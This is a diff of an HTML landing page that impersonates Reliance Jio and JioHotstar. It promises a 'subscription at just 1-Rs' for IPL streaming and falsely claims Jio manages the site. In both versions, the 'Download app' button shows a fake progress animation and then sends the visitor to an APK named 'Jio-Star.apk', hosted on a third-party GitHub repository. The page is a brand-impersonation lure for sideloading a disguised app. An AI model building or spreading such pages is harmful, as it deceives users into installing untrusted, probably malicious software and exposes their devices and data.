@@ -2,224 +2,223 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Get 10GB at just 1-Rs with Jio Hotstar Subcription">
-    <meta property="og:title" content="10GB at just 1-Rs with IPL streaming in HD quality.">
-    <meta property="og:description" content="JioHotstar">
-    <meta property="og:image" content="https://www.m9.news/wp-content/uploads/2025/02/jio-hotstar-logo-really-that-terrible-1024x768.jpg"> <!-- Replace with your image URL -->
-    <meta property="og:url" content="https://rebrand.ly/Jio-4G">
-    <title>Jio Services</title>
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PM Muft-Bijli</title>
     <style>
-        body {
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+
+        * {
             margin: 0;
-            font-family: 'Roboto', sans-serif;
-            background-color: #f5f5f5;
+            padding: 0;
+            box-sizing: border-box;
         }
-        header {
-            background-color: #0A4BBA;
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #f4f7fc;
+            text-align: center;
+            padding-bottom: 70px;
+        }
+
+        .top-bar {
+            background: #0f3cc9;
             color: white;
-            padding: 1rem;
+            padding: 16px 30px;
+            font-size: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.2rem;
-            font-weight: 600;
-        }
-        header img {
-            height: 45px;
-            margin-right: 8px;
-        }
-        .container {
-            max-width: 90%;
-            margin: 2rem auto;
-            padding: 1rem;
-            background-color: white;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            text-align: center;
-        }
-        .container h1 {
-            font-size: 1.8rem;
-            color: #333;
-            font-family: 'Poppins', sans-serif;
-            text-align: center; /* Ensures text is centered */
-            transform: none; /* Ensures there's no rotation applied */
-            margin: 0; /* Removes extra spacing if any */
+            gap: 10px;
         }
 
-        .container h4 {
-            font-size: 1.4rem;
-            color: #333;
-            font-family: 'Poppins', sans-serif;
+        .top-bar img {
+            height: 35px;
         }
-        .container p {
-            font-size: 1rem;
-            color: #666;
-            margin: 1rem 0;
-        }
-        .features {
+
+        .header {
+            background: white;
+            padding: 15px 10px;
             text-align: center;
-            margin: 1rem 0;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
         }
-        .features ul {
-            list-style: none;
-            padding: 0;
-            margin: 0 auto;
+
+        .header h1 {
+            font-size: 22px;
+            color: #000;
+            font-weight: 700;
+        }
+
+        .hero {
+    background: linear-gradient(to right, #eef2f6, #ffffff);
+    padding: 15px 10px;
+    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1), 
+                0px -4px 8px rgba(0, 0, 0, 0.1); /* Shadow on both top & bottom */
+    text-align: center;
+}
+
+
+        .hero h1 {
+            font-size: 26px;
+            color: #000;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .hero h1 span {
+            color: #0f3cc9;
+        }
+
+        .hero p {
+            font-size: 16px;
+            color: #444;
+            margin-bottom: 10px;
+        }
+
+        .hero ul {
             text-align: left;
             max-width: 300px;
+            padding-left: 20px;
+            margin: 0 auto;
         }
-        .features ul li {
-            display: flex;
-            align-items: center;
-            margin-bottom: 0.9rem;
-            font-size: 0.9rem;
-            color: #555;
+
+        .hero ul li {
+            font-size: 15px;
+            margin-bottom: 6px;
         }
-        .features ul li::before {
-            content: '\2713';
-            color: #0A4BBA;
-            font-weight: bold;
-            margin-right: 0.5rem;
+
+        .hero-image {
+            width: 150px;
+            margin-top: 20px;
         }
-        .download-button {
-            display: inline-block;
-            background-color: #0A4BBA;
+
+        .download-btn {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #0f3cc9;
             color: white;
-            text-decoration: none;
-            padding: 0.8rem 1.5rem;
-            border-radius: 30px;
-            font-size: 1rem;
-            font-weight: bold;
-            transition: background-color 0.3s ease;
-            margin-top: 0.5rem;
-            width: 50%;
-            max-width: 150px;
-        }
-        .download-button:hover {
-            background-color: #083D93;
-        }
-        footer {
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 700;
             text-align: center;
-            padding: 1rem;
-            background-color: #0A4BBA;
-            color: white;
-            margin-top: 2rem;
+            text-decoration: none;
+            transition: background 0.3s;
         }
-        #progressModal {
+
+        .download-btn:hover {
+            background: #0f3cc9;
+        }
+
+        footer {
+            background: #0f3cc9;
+            color: white;
+            padding: 12px;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        /* Progress Bar */
+        .progress-overlay {
             display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.5);
             justify-content: center;
             align-items: center;
         }
+
         .progress-container {
-            width: 80%;
-            max-width: 250px;
-            background-color: white;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
+            width: 120px;
+            height: 120px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-        }
-        .progress-spinner {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0A4BBA;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1.5s linear infinite;
+            background: conic-gradient(#0f3cc9 0deg, #ccc 0deg);
+            position: relative;
         }
+
+        .progress-container::before {
+            content: "";
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background: white;
+            border-radius: 50%;
+        }
+
         .progress-text {
-            color: #333;
-            font-size: 1rem;
-            font-family: 'Roboto', sans-serif;
+            position: absolute;
+            font-size: 16px;
+            font-weight: bold;
+            color: #0f3cc9;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        @media (max-width: 768px) {
-            header {
-                font-size: 1rem;
-            }
-            header img {
-                height: 25px;
-                margin-right: 5px;
-            }
-            .container h1,h4 {
-                font-size: 1.5rem;
-            }
-            .container p {
-                font-size: 0.9rem;
-            }
-            .features ul li {
-                font-size: 0.85rem;
-            }
-        }
+
     </style>
 </head>
 <body>
-    <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png" height="180"/>
-        <span>Hotstar</span>
-    </header>
-    <div class="container">
-        <h1>Get exclusive Jio offers from here</h1>
-        <h4>This Offer Includes</h4>
-        <div class="features">
-            <ul>
-                <li>Get 10GB at Just 1-Rs with JioHotstar.</li>
-                <li>Get Continous speed without any buffering</li>
-                <li>Watch IPL-2025 in HD and 4K.</li>
-                <li>Instant help with 24/7 customer support</li>
-            </ul>
-        </div>
-        <a id="downloadButton" href="#" class="download-button">Download Now</a>
+    <div class="top-bar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Jio_True_5G_Logo.svg/2560px-Jio_True_5G_Logo.svg.png" alt="Hotstar">
+        
     </div>
+
+    <div class="header">
+        <h1>JioHotstar IPL Offer</h1>
+    </div>
+
+    <div class="hero">
+
+        <img src="https://static.toiimg.com/thumb/msid-119271341,imgsize-38302,width-400,resizemode-4/119271341.jpg" 
+             class="hero-image">
+
+        <h1>JioHotstar Subcription<br><span>at just 1-Rs</span></h1>
+        <p><strong>Key Benefits:</strong></p>
+        <ul>
+            <li>Jio Annonunces JioHotstar subcription at 1-RS for 90-Days.</li>
+            <li>Watch IPL-2025, Movies and series<br>in HD/4K Quality.</li>
+            <li>This offer is for all Jio users.</li>
+            <li>Download JioStar app from below and claim this offer.</li>
+        </ul>
+        
+    </div>
+
+    <a id="downloadButton" href="#" class="download-btn">Download app</a>
+
     <footer>
         &copy; 2025 Jio. All Rights Reserved.
-        <div class="b2card"></div>
-        <br>
-            Website Content Managed by <b>Jio</b>
-            <br>
-          
-        </div>
     </footer>
 
-    <div id="progressModal">
+    <!-- Progress Bar Overlay -->
+    <div class="progress-overlay" id="progressOverlay">
         <div class="progress-container">
-            <div class="progress-spinner" id="progressSpinner"></div>
-            <div class="progress-text" id="progressText">Starting download...</div>
+            <div class="progress-text" id="progressText">0%</div>
         </div>
     </div>
 
     <script>
-        const firstLink = "https://github.com/techglr/claim/raw/refs/heads/main/Jio-Star.apk";
-        const secondLink = "https://github.com/techglr/claim/raw/refs/heads/main/Jio-Star.apk";
-        const startTime = new Date().getTime();
-        const progressModal = document.getElementById("progressModal");
-        const progressSpinner = document.getElementById("progressSpinner");
-        const progressText = document.getElementById("progressText");
-
         document.getElementById("downloadButton").addEventListener("click", function (event) {
             event.preventDefault();
-            progressModal.style.display = "flex";
-            setTimeout(function() {
-                const currentTime = new Date().getTime();
-                const elapsedMinutes = (currentTime - startTime) / (1000 * 60);
-                const downloadLink = elapsedMinutes <= 30 ? firstLink : secondLink;
-                window.location.href = downloadLink;
-                progressModal.style.display = "none";
-            }, 1000);
+            let overlay = document.getElementById("progressOverlay");
+            let progressText = document.getElementById("progressText");
+
+            overlay.style.display = "flex";
+
+            let progress = 0;
+            let interval = setInterval(() => {
+                progress += 10;
+                progressText.innerText = progress + "%";
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        overlay.style.display = "none";
+                        window.location.href = "https://github.com/techglr/claim/raw/refs/heads/main/Jio-Star.apk";
+                    }, 500);
+                }
+            }, 200);
         });
     </script>
 <script type="text/javascript">
@@ -230,11 +229,11 @@ var sc_security="a10820b5";
 <script type="text/javascript"
 src="https://www.statcounter.com/counter/counter.js"
 async></script>
-<noscript><div class="statcounter"><a title="Web Analytics
-Made Easy - Statcounter" href="https://statcounter.com/"
-target="_blank"><img class="statcounter"
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img
+class="statcounter"
 src="https://c.statcounter.com/12889744/0/a10820b5/1/"
-alt="Web Analytics Made Easy - Statcounter"
+alt="Web Analytics"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 </body>
 </html>
